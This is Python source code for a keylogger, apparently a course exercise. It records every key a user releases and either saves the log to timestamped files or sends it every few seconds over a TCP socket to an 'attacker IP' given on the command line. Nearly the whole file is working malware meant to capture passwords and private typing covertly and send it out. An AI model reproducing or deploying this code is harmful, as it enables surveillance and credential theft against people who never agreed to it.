import keyboard
from threading import Timer
from datetime import datetime
from optparse import OptionParser
import socket
#need to implement command line parser using optparser module learned from Black Python course lesson 1

TIME_TO_REPORT = 4
#ATACK_SVR_IP =  


def get_arguments():
    #Define Class OptionParser()
    parser = OptionParser()
    parser.add_option("-m", "--method", dest="Method", help="Key log export method")
    parser.add_option("-i", "--interval", dest="Interval", help="Interval to log")
    parser.add_option("-p", "--ip", dest="IP", help="Attacker IP address")

    options, arguments = parser.parse_args()
    return options # <class 'optparse.<dest>'>

class Keylogger():
    """docstring for Keylogger"""
    def __init__(self, interval, method='',svr_ip=''):
        self.interval = interval
        self.method = method
        self.log =''
        self.svr_ip = svr_ip
        self.start_time = datetime.now()
        self.end_time = datetime.now()        

    def callback(self, event):
        key_name = event.name

        #Sanitize key types
        if key_name == "space":
            key_name = " "
        elif key_name == "enter":
            key_name = "[ENTER]\n"
        elif key_name == "decimal":
            key_name =  "."
        else:
            #replace spaces with ____
           key_name = key_name.replace(" ","__")
 
        #populate the log
        self.log += key_name        

    def update_timetile(self):
        #filename = identified by start & end datetimes
        start_time_st = str(self.start_time)[:-7].replace(" ","-").replace(":","")
        end_time_st = str(self.end_time)[:-7].replace(" ","-").replace(":","")
        self.time_tile = f"keylog-{start_time_st}__{end_time_st}"


    def file_exporting(self):
        self.file_name = self.time_tile
        with open(f"{self.file_name}.txt","w") as f:
            print(self.log, file =f)
        print(f"[+] Saved {self.file_name}.txt")

    def initiate_connection(self):
        hostname = self.svr_ip
        #port = self.port
        port = 3000
        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        self.s.connect((hostname, port))
        print(f"[+] Connected to Attack_SVR at {hostname}")

    def chat_svr_report(self):
        print(f"[+] Attack is under way -- scanning keystrock every [{self.interval}] sec ")
        print("[+] Chat_svr ")

        if self.log:
            try:
                self.end_time = datetime.now()
                self.update_timetile()

                to_send = f"[+]{self.time_tile} {self.log}"
                self.s.send(to_send.encode('utf-8'))
                response = self.s.recv(2048)
                if not response:
                    print("Err: Sent fail!")
                    s.close()

                print(f'[+]Server: {response} at {self.time_tile}')  

                self.start_time = datetime.now() #for the next new round
                print('-'*25+'\n') 
                
            except KeyboardInterrupt:
                to_send = b'SECRET-QUIT-COMMAND'
                self.s.send(to_send.encode('utf-8'))
                         
       
        elif self.log =='':
            print(f'No keystrock during this {self.interval} interval')
            print('-'*25+'\n')

        self.log =''

        # set chat_svr thread as a daemon (dies when main thread die)
        #enable it to call itself every <interval> seconds
        timer = Timer(interval=self.interval, function=self.chat_svr_report)
        timer.daemon = True
        timer.start()
        
        
    #[daemon-thread]: runs on a separate thread
    #call itself every 60sec and generate+send the report
    def file_report(self):
        print(f"[+]Attack [file_exporting] is under way -- scanning keystrock every [{self.interval}] sec ")
        if self.log:
            #it's time for new end_time for file_name (after every 60sec)
            self.end_time = datetime.now()

            #update filename with start and end time
            self.update_timetile()

            self.file_exporting()

            self.start_time = datetime.now() #for the next new round
            print('-'*25+'\n')
        
        elif self.log =='':
            print('[+]file_exporting')
            print(f'[-]No keystrock during this {self.interval} interval')
            print('-'*25+'\n')

        #Reset for next interval    
        self.log=''
        
        # set file_report thread as a daemon (dies when main thread die)
        #enable it to call itself every <interval> seconds
        timer = Timer(interval=self.interval, function=self.file_report)
        timer.daemon = True
        timer.start()

    def start(self):
        #self.get_arguments()
        try:
            self.start_time = datetime.now()

            keyboard.on_release(callback=self.callback)

            if self.method == 'chat_svr':
                self.initiate_connection()
                self.chat_svr_report()
               
            else:
                self.file_report() 

            keyboard.wait() #block main thread and exit by CTR + C (hence the daemon thread is killed too!)
        except KeyboardInterrupt:
            print("\nGoodbye! and Thank you ❤")        

#Code guard
if __name__ == "__main__":
    try:
        print("""[+]-m: method (file_export / chat_svr
   -i: interval
   --ip: attack_svr IP address""")
        print("[+]Default export method: file exporting")
        print("[+]Note: if use chat_svr, need to specify attacking_svr IP address using --ip")
        print("------- Hit Enter when ready! ------")
        #input()

        #option = a property of <class 'optparse.Values'>
        options = get_arguments()
        interval,method, attack_ip = options.Interval, options.Method, options.IP


        if method:
            Keylogger = Keylogger(int(interval),method,attack_ip) #cmd arguments for method, chat svr [listening-IP]
        else:
            Keylogger = Keylogger(int(interval))
            
        Keylogger.start()
    except KeyboardInterrupt:
        print("\nGoodBye and Goodday!")